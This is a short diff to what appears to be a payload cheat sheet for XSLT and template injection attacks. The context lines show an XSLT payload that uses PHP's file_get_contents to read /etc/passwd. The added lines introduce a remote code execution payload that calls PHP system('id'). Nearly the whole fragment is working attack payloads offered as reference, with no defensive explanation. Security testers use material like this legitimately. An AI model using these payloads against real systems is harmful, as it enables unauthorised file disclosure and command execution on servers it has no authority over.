@@ -139,6 +139,10 @@ Product Version: <xsl:value-of select="system-property('xsl:product-version')" /
 ```
 <xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
 ```
+### Remote Code Execution (RCE)
+```
+<xsl:value-of select="php:function('system','id')" />
+```
 ### tplmap.py
 ### SSTI Exploitation Example 1
 ```
